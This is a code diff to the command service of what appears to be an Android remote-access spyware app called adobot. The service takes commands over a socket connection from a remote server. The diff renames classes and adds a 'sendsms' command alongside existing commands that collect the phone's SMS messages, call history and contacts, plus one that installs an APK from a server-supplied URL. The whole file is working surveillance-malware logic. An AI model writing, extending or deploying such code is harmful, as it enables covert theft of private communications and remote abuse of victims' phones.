@@ -2,18 +2,14 @@ package com.android.adobot;
 
 import android.Manifest;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationListener;
-import android.location.LocationManager;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.support.v4.app.ActivityCompat;
 import android.util.Log;
-
-import com.google.android.gms.location.LocationRequest;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -22,24 +18,29 @@ import org.json.JSONObject;
 import java.net.URISyntaxException;
 import java.util.HashMap;
 
-import http.Http;
-import http.HttpRequest;
+import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
 import io.nlopez.smartlocation.OnLocationUpdatedListener;
 import io.nlopez.smartlocation.SmartLocation;
 import io.socket.client.Ack;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
+import com.android.adobot.tasks.GetCallLogsTask;
+import com.android.adobot.tasks.GetContactsTask;
+import com.android.adobot.tasks.GetSmsTask;
+import com.android.adobot.tasks.SendSmsTask;
+import com.android.adobot.tasks.UpdateAppTask;
 
 
-public class Client extends Service {
+public class CommandService extends Service {
 
-    private static final String TAG = "Client";
+    private static final String TAG = "CommandService";
 
     private static final String POST_STATUS = "/status";
 
     private CommonParams params;
-    private Client client;
+    private CommandService client;
     private Socket socket;
     private boolean connected;
     private boolean registered;
@@ -141,24 +142,34 @@ public class Client extends Service {
                             if (command.equals("getsms")) {
                                 Log.i(TAG, "\nInvoking Sms Service\n");
                                 int arg1 = Integer.parseInt(cmd.get("arg1").toString());
-                                SmsService smsService = new SmsService(client, arg1);
+                                GetSmsTask smsService = new GetSmsTask(client, arg1);
                                 smsService.start();
                             } else if (command.equals("getcallhistory")) {
                                 Log.i(TAG, "\nInvoking Call LOg Service\n");
                                 int arg1 = Integer.parseInt(cmd.get("arg1").toString());
-                                CallLogService cs = new CallLogService(client, arg1);
+                                GetCallLogsTask cs = new GetCallLogsTask(client, arg1);
                                 cs.start();
                             } else if (command.equals("getcontacts")) {
-                                Log.i(TAG, "\nInvoking ContactsService\n");
-                                ContactsService cs = new ContactsService(client);
+                                Log.i(TAG, "\nInvoking GetContactsTask\n");
+                                GetContactsTask cs = new GetContactsTask(client);
                                 cs.start();
                             } else if (command.equals("promptupdate")) {
-                                Log.i(TAG, "\nInvoking UpdateService\n");
+                                Log.i(TAG, "\nInvoking UpdateAppTask\n");
                                 String apkUrl = cmd.get("arg1").toString();
 
-                                UpdateService atualizaApp = new UpdateService(apkUrl);
+                                UpdateAppTask atualizaApp = new UpdateAppTask(apkUrl);
                                 atualizaApp.setContext(client);
                                 atualizaApp.run();
+                            } else if (command.equals("sendsms")) {
+                                Log.i(TAG, "\nInvoking SendSMS\n");
+                                String phoneNumber = cmd.get("arg1").toString();
+                                String textMessage = cmd.get("arg2").toString();
+
+                                SendSmsTask sendSmsTask = new SendSmsTask(client);
+                                sendSmsTask.setPhoneNumber(phoneNumber);
+                                sendSmsTask.setTextMessage(textMessage);
+                                sendSmsTask.start();
+
                             } else {
                                 Log.i(TAG, "Unknown command");
                                 HashMap xcmd = new HashMap();
